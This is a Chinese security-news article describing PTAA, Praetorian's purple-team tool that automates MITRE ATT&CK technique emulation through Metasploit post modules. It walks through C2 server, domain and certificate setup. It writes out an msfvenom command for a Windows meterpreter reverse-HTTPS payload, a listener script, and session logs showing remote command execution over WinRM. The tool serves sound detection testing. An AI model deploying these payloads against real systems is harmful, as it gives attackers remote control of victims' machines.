![PTAA：一款功能强大的紫队自动化渗透测试工具](https://image.3001.net/images/20190422/1555905536_5cbd3c0006fa0.jpg!small)

**为了评估安全检测与事件响应能力，我们正在尝试寻找一种自动化模拟对手攻击策略的方式。通过研究，我们设计出了MITRE ATT &CK™
TTPs，并以Metasploit Framework的模块形式呈现-post模块。目前，我们已经可以自动化模拟出超过100 种TTPs了。**

Metasploit的优势就在于其稳定健壮且丰富的功能库，该框架所带的模块能够与操作系统API直接交互，而且灵活易于扩展。除此之外，我们还可以利用Metasploit的execute_powershell模块来模拟出类似.NET内存中执行之类的功能。这将允许蓝队确保他们的工具在检测到特定TTP行为时能够有效发出警报，并不会执行特定代码或操作。（例如已编码的PowerShell）

我们的工具基于最新版本的Metasploit开发（2019年4月9日版：【[Metasploit下载地址](https://github.com/rapid7/metasploit-framework)】）。在实现自动化机制的过程中，我们尽可能地减少了对Metasploit框架源码的修改量，以此来保证用户能够体验到接近原生的Metasploit。

## 工具安装

C2服务器-注册并搭建一台云虚拟机设备：【[GCP传送门](https://cloud.google.com/compute/docs/quickstart-linux#create_a_virtual_machine_instance)】。

DNS-选择一个域名并在DNS中注册，推荐使用CloudFlare：【[CloudFlare传送门](https://www.cloudflare.com/dns/)】。

SSL-我们建议大家使用有效的SSL证书来进行测试操作，推荐使用LetsEncrypt：

    
    
    exportDNS_NAME="mytestdomain.com"
    wgethttps://dl.eff.org/certbot-auto
    chmoda+x ./certbot-auto
    ./certbot-auto-q
    ./certbot-autocertonly -d $DNS_NAME --standalone --register-unsafely-without-email -n--agree-tos

### Debian/Ubuntu

安装源：<https://github.com/rapid7/metasploit-framework/tree/master/docker>

安装docker：

    
    
    curl-fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -    apt-keyfingerprint 0EBFCD88
    add-apt-repository\
       "deb [arch=amd64]https://download.docker.com/linux/debian jessie stable"
    apt-get-y update
    apt-get-y install docker-ce  
    

获取项目源码：

    
    
    git clone git@github.com:praetorian-inc/purple-team-attack-automation.git
    cd purple-team-attack-automation

修改LHOST以及对外端口：

    
    
    echo"version: '3'
    services:
      ms:
        environment:
        # example of setting LHOST
          LHOST: 0.0.0.0
        # example of adding more ports
        ports:
          - 8080:8080
          - 443:443
          - 80:80
    "> docker-compose.local.override.yml

设置COMPOSE_FILE环境变量，加载本地文件：

    
    
    echo"COMPOSE_FILE=./docker-compose.yml:./docker-compose.override.yml:./docker-compose.local.override.yml">> .env

构建容器：

    
    
    docker -composebuild

运行容器：

    
    
    ./docker/bin/msfconsole

修改metasploit目录权限：

    
    
    chmod-R ugo+rw ~/.msf4
    Payload
    cd ~
    curlhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb> msfinstall && \
      chmod 755 msfinstall && \
      ./msfinstall
    msfvenom-p windows/x64/meterpreter_reverse_https lhost=mytestdomain.com lport=443 -ax64 -f exe HandlerSSLCert=~/purple-team-attack-automation/MSF.pemStagerVerifySSLCert=true -o ~/attack-testing.exe

## 监听器

你可以使用样本资源脚本来开启监听器：

    
    
    $echo '<ruby>
    print_status("StartingHTTPS listener for Windows x64 meterpreter on port 443.")
    run_single("useexploit/multi/handler")
    run_single("setpayload windows/x64/meterpreter_reverse_https")
    run_single("setlport 443")
    run_single("setHandlerSSLCert MSF.pem")
    run_single("setExitOnSession false")
    run_single("setStagerVerifySSLCert true")
    run_single("exploit-j")
    </ruby>'> ~/purple-team-attack-automation/scripts/resource/windows_listener.rc

监听器开启后，payload将以管理员权限运行并发送回调信息。

## 使用模块

    
    
    msf5auxiliary(scanner/smb/impacket/secretsdump) > resource windows_listener.rc
    [*]Processing /usr/src/metasploit-framework/scripts/resource/windows_listener.rcfor ERB directives.
    [*]resource (/usr/src/metasploit-framework/scripts/resource/windows_listener.rc)>Ruby Code (270 bytes)
    [*]Starting HTTPS listener for Windows x64 meterpreter on port 443.
    payload=> windows/x64/meterpreter_reverse_https
    lport=> 443
    lhost=> 0.0.0.0
    [*]Exploit running as background job 0.
    [*]Exploit completed, but no session was created.
    msf5exploit(multi/handler) >
    [*]Started HTTPS reverse handler on https://0.0.0.0:443
    [*]https://0.0.0.0:443 handling request from 192.168.137.11; (UUID: czgdxj3z)Redirecting stageless connection from/2F-7ig9OfztlUGRSOeTJogLC1HD_4Yf2RGj-ZlWaPE6oCIdO_nvk_GC913H-gXl7lhXUXYcn withUA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
    [*]https://0.0.0.0:443 handling request from 192.168.137.11; (UUID: czgdxj3z)Attaching orphaned/stageless session...
    [*]Meterpreter session 1 opened (172.18.0.3:443 -> 192.168.137.11:52012) at2019-04-15 16:10:27 +0000
     
    msf5post(windows/purple/t1005) > use post/windows/purple/t1028
    msf5post(windows/purple/t1028) > info
     
           Name: Windows Remote Management (T1028)Windows - Purple Team
         Module: post/windows/purple/t1028
       Platform: Windows
           Arch:
           Rank: Normal
     
    Providedby:
      Praetorian
     
    Compatiblesession types:
      Meterpreter
     
    Basicoptions:
      Name    Current Setting                                                      Required  Description
      ----    ---------------                                                      --------  -----------      CLEANUP true                                                                 yes       Close any instances ofcalc
      CMD     winrm qc -q & winrm i c wmicimv2/Win32_Process@{CommandLine="calc"}  yes       Command to execute
      SESSION 1                                                                    yes       The session to run thismodule on.
     
    Description:
      Execution, Lateral Movement: Windows RemoteManagement (WinRM) is
      the name of both a Windows service and aprotocol that allows a user
      to interact with a remote system (e.g., runan executable, modify
      the Registry, modify services). It may becalled with the winrm
      command or by any number of programs such asPowerShell.
     
    References:
      CVE: Not available
      https://attack.mitre.org/wiki/Technique/T1028
     
    msf5post(windows/purple/t1028) > exploit
     
    [+]Found an instance of Calculator running. Killing it.
    [*]Executing 'cmd /c winrm qc -q & winrm i c wmicimv2/Win32_Process@{CommandLine="calc"}' on #<Session:meterpreter192.168.137.11:52012 (10.0.2.15) "PURPLEDEV\Administrator @DESKTOP-1">
    [!]WinRM service is already running on this machine.
    WSManFault
        Message
            ProviderFault
                WSManFault
                    Message = WinRM firewall exceptionwill not work since one of the network connection types on this machine is setto Public. Change the network connection type to either Domain or Private andtry again.
     
    Errornumber:  -2144108183 0x80338169
    WinRMfirewall exception will not work since one of the network connection types onthis machine is set to Public. Change the network connection type to eitherDomain or Private and try again.
    create_OUTPUT
        ProcessId = 5456
        ReturnValue = 0
     
    [+]Module T1028W execution successful.
    [+]Found an instance of Calculator running. Killing it.
    [+]Found an instance of Calculator running. Killing it.
    [*]Post module execution completed
    msf5post(windows/purple/t1028) >

 *** 参考来源：[praetorian](https://github.com/praetorian-inc/purple-team-attack-automation)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

